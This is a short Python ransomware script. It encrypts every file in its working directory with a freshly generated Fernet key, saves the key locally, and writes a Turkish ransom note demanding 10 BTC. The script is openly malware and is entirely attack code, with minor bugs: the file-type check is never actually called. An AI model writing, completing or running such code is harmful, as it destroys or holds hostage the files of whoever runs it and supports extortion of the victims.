#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "ransomware.py" or file == "thekey.key":
		continue
	if os.path.isfile:
		files.append(file)	


print(file)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)


for file in files:
	bildiri = open("bildiri.txt" , "w")
	bildiri.write("sisteme bir fidye yazlımı sızdırıldı 10 BTC öde")
	
	
	with open(file, "rb") as thefile:
		contents = thefile.read()
		contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)	
